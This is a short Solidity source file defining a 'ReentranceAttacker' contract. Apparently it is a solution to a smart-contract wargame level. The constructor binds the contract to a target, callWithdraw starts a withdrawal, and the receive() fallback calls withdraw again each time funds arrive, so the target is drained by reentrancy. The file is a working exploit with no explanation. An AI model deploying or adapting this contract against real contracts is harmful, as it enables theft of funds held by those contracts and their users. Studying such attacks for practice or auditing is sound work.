// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ReentranceI {
    function withdraw(uint _amount) external;
}

contract ReentranceAttacker {
    ReentranceI reentrance;

    constructor(address _reentrance) {
        reentrance = ReentranceI(_reentrance);
    }

    function callWithdraw(uint amount) external payable {
        reentrance.withdraw(amount);
    }

    receive() external payable {
        reentrance.withdraw(msg.value);
    }
}
